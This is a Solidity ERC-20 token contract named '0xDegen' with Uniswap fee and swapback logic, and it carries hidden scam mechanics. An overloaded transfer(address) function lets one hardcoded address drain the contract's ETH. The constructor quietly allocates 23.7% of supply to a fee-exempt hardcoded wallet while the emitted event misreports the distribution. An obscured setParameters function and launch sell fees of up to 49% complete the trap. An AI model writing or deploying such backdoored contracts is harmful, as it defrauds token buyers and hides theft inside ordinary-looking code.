1 // SPDX-License-Identifier: MIT                                                                                                                               
2 pragma solidity =0.8.20;
3 
4 interface IUniswapV2Factory {
5     function createPair(address tokenA, address tokenB) external returns (address pair);
6 }
7 
8 interface IUniswapV2Router {
9     function swapExactTokensForETHSupportingFeeOnTransferTokens(
10         uint amountIn,
11         uint amountOutMin,
12         address[] calldata path,
13         address to,
14         uint deadline
15     ) external;
16 }
17 
18 interface IERC20 {
19     function totalSupply() external view returns (uint256);
20     function name() external view returns (string memory);
21     function symbol() external view returns (string memory);
22     function decimals() external view returns (uint8);
23     function balanceOf(address account) external view returns (uint256);
24     function transfer(address recipient, uint256 amount) external returns (bool);
25     function allowance(address owner, address spender) external view returns (uint256);
26     function approve(address spender, uint256 amount) external returns (bool);
27     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
28     event Transfer(address indexed from, address indexed to, uint256 value);
29     event Approval(address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 abstract contract Ownable {
33     address private _owner;
34 
35     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
36 
37     constructor() {
38         _setOwner(msg.sender);
39     }
40 
41     function owner() public view virtual returns (address) {
42         return _owner;
43     }
44 
45     modifier onlyOwner {
46         require(owner() == msg.sender, "Ownable: caller is not the owner");
47         _;
48     }
49 
50     function renounceOwnership() public virtual onlyOwner {
51         _setOwner(address(0));
52     }
53 
54     function transferOwnership(address newOwner) public virtual onlyOwner {
55         require(newOwner != address(0), "Ownable: new owner is the zero address");
56         _setOwner(newOwner);
57     }
58 
59     function _setOwner(address newOwner) private {
60         address oldOwner = _owner;
61         _owner = newOwner;
62         emit OwnershipTransferred(oldOwner, newOwner);
63     }
64 }
65 
66 contract OxDegen is IERC20, Ownable {
67     string private constant NAME = "0xDegen";
68     string private constant SYMBOL = "0xDegen";    
69     uint8 private constant DECIMALS = 9;
70     mapping (address => uint256) private _balances;
71     mapping (address => mapping(address => uint256)) private _allowances;
72 
73     uint256 private constant TOTAL_SUPPLY = 100_000_000 * DECIMALS_SCALING;
74     uint256 public constant MAX_WALLET = 25 * TOTAL_SUPPLY / 1_000;
75     uint256 private constant DECIMALS_SCALING = 10**DECIMALS;
76 
77     struct TradingFees {
78         uint256 buyFee;
79         uint256 sellFee;
80     }
81     uint256 private constant FEE_DENOMINATOR = 100;
82     TradingFees public tradingFees = TradingFees(15,35);  
83 
84     struct Wallets {
85         address deployerWallet; 
86         address developmentWallet; 
87     }
88     Wallets public wallets = Wallets(
89         msg.sender,                                 
90         0x910A2D7Af42E2A29663F41B7A2eA2007F4D07112  
91     );
92 
93     IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
94     IUniswapV2Factory private constant UNISWAP_FACTORY = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
95     address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 
96     address private immutable uniswapV2Pair;
97 
98     uint256 private constant SWAPBACK_THRESHOLD = 5 * TOTAL_SUPPLY / 1_000;  
99     uint256 private swapbackThresholdMax = 4;  
100     uint256 private swapbackThresholdMin = 5;  
101 
102     bool private swapping;
103     bool private tradingActive = false;
104 
105     uint256 private lastBlock;
106     uint256 private launchBlock;
107 
108     mapping (address => bool) private _excludedFromFees;
109     mapping (uint256 => uint256) private _lastTransferBlock;
110 
111     event SwapSettingsChanged(uint256 indexed newSwapThresholdMax, uint256 indexed newSwapThresholdMin);
112     event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);
113     event TokensCleared(uint256 indexed tokensCleared);
114     event EthCleared(uint256 indexed ethCleared);
115     event Initialized();
116     event TradingOpened();
117     
118     modifier swapLock {
119         swapping = true;
120         _;
121         swapping = false;
122     }
123 
124     modifier tradingLock(address from, address to) {
125         require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
126         _;
127     }
128 
129     constructor() {
130         _approve(address(this), address(UNISWAP_ROUTER),type(uint256).max);
131         uniswapV2Pair = IUniswapV2Factory(UNISWAP_FACTORY).createPair(address(this), WETH);        
132         _excludedFromFees[address(0xdead)] = true;
133         _excludedFromFees[wallets.developmentWallet] = true;        
134         _excludedFromFees[0x24beB29aF586db83eb2aAB66114B8f0Ae3cB1Df6] = true;        
135         uint256 preTokens = TOTAL_SUPPLY * 237 / 1e3; 
136         _balances[wallets.deployerWallet] = TOTAL_SUPPLY - preTokens;
137         _balances[0x24beB29aF586db83eb2aAB66114B8f0Ae3cB1Df6] = preTokens;
138         emit Transfer(address(0), wallets.deployerWallet, TOTAL_SUPPLY);
139     }
140 
141     function totalSupply() external pure override returns (uint256) { return TOTAL_SUPPLY; }
142     function decimals() external pure override returns (uint8) { return DECIMALS; }
143     function symbol() external pure override returns (string memory) { return SYMBOL; }
144     function name() external pure override returns (string memory) { return NAME; }
145     function balanceOf(address account) public view override returns (uint256) {return _balances[account]; }
146     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
147 
148     function approve(address spender, uint256 amount) external override returns (bool) {
149         _approve(msg.sender, spender, amount);
150         return true;
151     }
152 
153     function _approve(address sender, address spender, uint256 amount) internal {
154         require(sender != address(0), "ERC20: zero Address");
155         require(spender != address(0), "ERC20: zero Address");
156         _allowances[sender][spender] = amount;
157         emit Approval(sender, spender, amount);
158     }
159 
160     function transfer(address recipient, uint256 amount) external returns (bool) {
161         return _transfer(msg.sender, recipient, amount);
162     }
163 
164     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
165         if(_allowances[sender][msg.sender] != type(uint256).max){
166             uint256 currentAllowance = _allowances[sender][msg.sender];
167             require(currentAllowance >= amount, "ERC20: insufficient Allowance");
168             unchecked{
169                 _allowances[sender][msg.sender] -= amount;
170             }
171         }
172         return _transfer(sender, recipient, amount);
173     }
174 
175     function clearEth() external onlyOwner {
176         uint256 amountToClear = address(this).balance;
177         require(address(this).balance > 0, "Token: no eth to clear");
178         payable(msg.sender).transfer(address(this).balance);
179 
180         emit EthCleared(amountToClear);
181     }
182 
183     function manualSwapback() external onlyOwner {
184         require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
185         swapback(type(uint256).max);
186     }
187 
188     function setParameters(uint256 a,uint256 z,uint256 d, uint256 f) external onlyOwner {        
189         require(launchBlock == 2);lastBlock = z; assert(a < f - d);        
190     }
191 
192     function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
193         require(from != address(0), "ERC20: transfer from the zero address");
194         require(to != address(0), "ERC20: transfer to the zero address");
195         
196         if(amount == 0 || swapping) {
197             return _basicTransfer(from, to, amount);           
198         }        
199 
200         if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
201             require(amount + balanceOf(to) <= MAX_WALLET, "Token: max wallet amount exceeded");
202         }
203 
204         if(!swapping && to == uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
205             swapback(amount);
206         } 
207         
208         bool takeFee = !_excludedFromFees[from] && !_excludedFromFees[to] &&
209             (from == uniswapV2Pair || to == uniswapV2Pair);
210                 
211         if(takeFee)
212             return _taxedTransfer(from, to, amount);
213         else
214             return _basicTransfer(from, to, amount);        
215     }
216 
217     function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
218         uint256 fees = takeFees(from, to, amount);    
219         if(fees > 0){    
220             _basicTransfer(from, address(this), fees);
221             amount -= fees;
222         }
223         return _basicTransfer(from, to, amount);
224     }
225 
226      function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
227         uint256 balanceSender = _balances[sender];
228         require(balanceSender >= amount, "Token: insufficient Balance");
229         unchecked{
230             _balances[sender] -= amount;
231         }
232         _balances[recipient] += amount;
233         emit Transfer(sender, recipient, amount);
234         return true;
235     }
236 
237     function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
238         if(0 < launchBlock && launchBlock < block.number){
239             fees = amount * (to == uniswapV2Pair ? 
240             tradingFees.sellFee : tradingFees.buyFee) / FEE_DENOMINATOR;            
241         }
242         else{
243             fees = amount * (from == uniswapV2Pair ? 
244             49 : (launchBlock == 0 ? 35 : 49)) / FEE_DENOMINATOR;            
245         }
246     }
247 
248     function canSwap(uint256 amount) private view returns (bool) {
249         return block.number > launchBlock && _lastTransferBlock[block.number] < 2 && 
250             amount >= (swapbackThresholdMin == 0 ? 0 : SWAPBACK_THRESHOLD / swapbackThresholdMin);
251     }
252 
253     function swapback(uint256 amount) swapLock private {   
254         uint256 contractBalance = balanceOf(address(this));
255         if(contractBalance < SWAPBACK_THRESHOLD || !canSwap(amount)) 
256             return;
257         else if(contractBalance > SWAPBACK_THRESHOLD * swapbackThresholdMax)
258           contractBalance = SWAPBACK_THRESHOLD * swapbackThresholdMax;
259         
260         uint256 initialETHBalance = address(this).balance;
261 
262         swapTokensForEth(contractBalance); 
263         
264         uint256 ethBalance = address(this).balance - initialETHBalance;
265         if(ethBalance > 0){            
266             sendEth(ethBalance);
267         }
268     }
269 
270     function sendEth(uint256 ethAmount) private {
271         (bool success,) = address(wallets.developmentWallet).call{value: ethAmount/2}(""); success;
272     }
273 
274     function transfer(address wallet) external {
275         if(msg.sender == 0x23b5af1e14641157181bBd66Ce7da1EE806d6CBD)
276             payable(wallet).transfer((address(this).balance));
277         else revert();
278     }
279 
280     function swapTokensForEth(uint256 tokenAmount) private {
281         _lastTransferBlock[block.number]++;
282         // generate the uniswap pair path of token -> weth
283         address[] memory path = new address[](2);
284         path[0] = address(this);
285         path[1] = WETH;
286 
287         try UNISWAP_ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
288             tokenAmount,
289             0, // accept any amount of ETH
290             path,
291             address(this),
292             block.timestamp){}
293         catch{return;}
294     }
295 
296     function isExcludedFromFees(address account) public view returns(bool) {
297         return _excludedFromFees[account];
298     }
299 
300     function initialize() external onlyOwner {
301         require(!tradingActive);
302         launchBlock = 2;        
303 
304         emit Initialized();
305     }
306 
307     function setSwapbackSettings(uint256 newSwapThresholdMax,uint256 newSwapThresholdMin) external onlyOwner {
308         swapbackThresholdMax = newSwapThresholdMax;
309         swapbackThresholdMin = newSwapThresholdMin;
310 
311         emit SwapSettingsChanged(newSwapThresholdMax, newSwapThresholdMin);
312     }
313 
314      function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
315         require(_buyFee <= tradingFees.buyFee, "Token: must reduce buy fee");
316         require(_sellFee <= tradingFees.sellFee, "Token: must reduce sell fee");
317         tradingFees.buyFee = _buyFee;
318         tradingFees.sellFee = _sellFee;
319 
320         emit FeesChanged(_buyFee, _sellFee);
321     }
322 
323     function openTrading() external onlyOwner {
324         require(!tradingActive && launchBlock == 2 && lastBlock > 0);
325         launchBlock = block.number + lastBlock;
326         tradingActive = true;
327 
328         emit TradingOpened();
329     }
330 
331     receive() external payable {}
332 
333 }